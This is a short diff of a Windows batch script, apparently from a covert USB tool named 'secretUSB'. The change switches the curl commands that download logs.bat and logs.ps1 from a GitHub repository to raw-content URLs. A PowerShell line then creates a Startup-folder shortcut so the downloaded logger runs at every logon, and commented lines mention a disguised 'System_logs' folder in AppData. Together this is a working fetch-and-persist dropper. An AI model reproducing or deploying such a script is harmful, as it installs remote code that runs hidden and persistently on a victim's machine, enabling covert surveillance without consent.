@@ -88,8 +88,8 @@ REM mkdir %USERPROFILE%\AppData\Roaming\System_logs
 REM cd %USERPROFILE%\AppData\Roaming\System_logs
 cd C:\Users\SYSWIN\Desktop
 
-curl -O https://github.com/Goenae/secretUSB/raw/main/logs.bat
-curl -O https://github.com/Goenae/secretUSB/raw/main/logs.ps1
+curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.bat
+curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.ps1
 
 
 powershell.exe -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\%~logs.lnk');$s.TargetPath='%~logs.bat';$s.Save()"
